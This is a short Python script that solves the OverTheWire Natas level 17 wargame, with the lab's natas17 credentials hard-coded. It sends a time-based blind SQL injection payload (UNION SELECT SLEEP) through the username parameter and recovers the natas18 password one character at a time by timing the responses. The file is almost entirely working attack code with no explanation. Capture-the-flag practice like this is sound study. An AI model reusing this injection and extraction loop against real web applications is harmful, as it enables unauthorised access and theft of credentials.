# -*- coding: utf-8 -*-

import time
import requests

url = "http://natas17.natas.labs.overthewire.org/index.php?debug=1&username="
auth=("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")

# idée : 

inj = 'natas17" UNION SELECT SLEEP(1), 0 FROM users WHERE username="natas18" AND BINARY password LIKE "{0}%'

goodpwd = ""
alphanum = "azertyuiopmlkjhgfdsqwxcvbn"
alphanum += alphanum.upper()
alphanum += "0123456789"

done = False

while not done:
    done = True
    print("new loop; pwd = " +goodpwd)
    for char in alphanum:
        start = time.time()
        r = requests.get(url + inj.format(goodpwd+char), auth=auth)
        res = r.text
        end = time.time()
        if end-start > 1:
            goodpwd += char
            done=False
            break

print("done ; pwd = " + goodpwd)
